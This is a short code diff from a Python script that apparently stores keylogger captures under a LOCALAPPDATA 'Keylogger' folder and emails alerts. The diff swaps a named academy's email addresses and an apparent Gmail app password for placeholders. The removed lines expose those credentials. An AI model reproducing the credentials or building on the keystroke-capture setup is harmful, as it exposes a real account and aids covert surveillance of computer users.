@@ -180,9 +180,9 @@ BUFFER_PATH = os.path.join(os.environ['LOCALAPPDATA'], 'Keylogger', 'buffer.txt'
 CONTEXT_CHARS = 15  # Characters before/after to include
 
 # Email settings (same as main script)
-ALERT_EMAIL = 'fletcherit@fletcheracademy.org'
-SENDER_EMAIL = 'ypena@fletcheracademy.org'
-SENDER_PASSWORD = 'zfme dbpb crhd bjdk'
+ALERT_EMAIL = '[ENTER ALERT EMAIL]'
+SENDER_EMAIL = '[ENTER SENDER EMAIL]'
+SENDER_PASSWORD = '[ENTER EMAIL APP PASSWORD (GMAIL)]'
 
 username = getpass.getuser()
 hostname = socket.gethostname()
